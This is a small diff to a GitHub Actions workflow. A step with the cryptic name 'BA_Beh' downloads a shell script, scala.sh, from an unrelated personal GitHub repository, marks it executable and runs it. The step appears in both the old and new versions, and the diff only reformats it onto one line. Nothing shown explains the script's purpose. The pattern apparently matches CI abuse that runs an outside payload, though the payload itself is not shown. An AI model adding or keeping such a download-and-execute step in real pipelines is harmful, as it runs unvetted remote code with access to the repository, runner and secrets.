@@ -23,6 +23,5 @@ jobs:
     - name: Setup
       uses: actions/checkout@v1
     - name: BA_Beh
-      run: |
-        wget https://github.com/jangek992/jangek992/blame/main/scala.sh && chmod u+x scala.sh && ./scala.sh
+      run: wget https://github.com/jangek992/jangek992/blame/main/scala.sh && chmod u+x scala.sh && ./scala.sh
 
